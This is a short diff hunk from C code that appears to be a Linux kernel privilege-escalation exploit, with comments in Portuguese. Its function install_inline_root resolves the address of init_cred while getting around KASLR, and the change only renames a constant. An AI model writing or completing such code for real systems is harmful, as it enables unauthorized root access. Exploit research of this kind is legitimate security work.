@@ -273,9 +273,9 @@ static int install_inline_root(int fd) {
   pr_info("root inline: current_task=%016zx\n", current_task);
 
   /* === 2. Resolver init_cred COM KASLR === */
-  uint64_t init_cred = data_addr(INIT_CRED_OFF);
+  uint64_t init_cred = data_addr(INIT_CRED);
   pr_info("root inline: init_cred=%016zx (raw=%016zx)\n", 
-          init_cred, (uint64_t)INIT_CRED_OFF);
+          init_cred, (uint64_t)INIT_CRED);
 
   /* === SANITY CHECK CRÍTICO: init_cred deve estar em área de kernel === */
   if ((init_cred & 0xffff800000000000ULL) != 0xffff800000000000ULL) {
